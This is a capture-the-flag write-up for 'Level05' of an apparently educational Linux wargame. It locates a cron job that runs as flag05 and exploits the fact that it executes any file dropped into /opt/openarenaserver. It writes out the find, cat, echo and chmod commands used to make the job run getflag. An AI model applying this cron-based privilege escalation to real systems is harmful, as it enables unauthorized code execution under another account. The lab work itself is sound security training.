# Level05

## Objective
Exploit the crontab configuration to execute the command `/usr/sbin/openarenaserver` as `flag05`. Use the script `/usr/sbin/openarenaserver` to execute the `getflag` command and retrieve the flag.

## Steps

### Step 1: Identify Relevant Files
Use the `find` command to identify files related to `level05`:

```bash
find / -group flag05 2>/dev/null
find / -name "level05" 2>/dev/null
```

Results:
```plaintext
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
/var/mail/level05
/rofs/var/mail/level05
```

### Step 2: Examine Crontab Configuration
Check the contents of the crontab configuration for `flag05`:

```bash
cat /var/mail/level05
```

Result:
```plaintext
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This crontab runs the script `/usr/sbin/openarenaserver` every 2 minutes as `flag05`.

### Step 3: Examine `openarenaserver` Script
Check the contents of the `/usr/sbin/openarenaserver` script:

```bash
cat /usr/sbin/openarenaserver
```

Result:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

This script executes any file in `/opt/openarenaserver` and then deletes it.

### Step 4: Exploit the Crontab and Script
Create a file in `/opt/openarenaserver` that executes the `getflag` command:

```bash
echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag
```

Give execution permissions to the file:

```bash
chmod +x /opt/openarenaserver/getflag
```

After waiting for 2 minutes, the flag will be in the file `/tmp/flag`:

```bash
cat /tmp/flag
```

### Optional: Refine with Broadcast Message
Create a file in `/opt/openarenaserver` that broadcasts the `getflag` message to all users:

```bash
echo "/bin/getflag | wall" > /opt/openarenaserver/getflag
chmod +x /opt/openarenaserver/getflag
```

This will send the `getflag` message to all users.

Congratulations! You've successfully exploited the crontab configuration and script to execute the `getflag` command and retrieve the flag.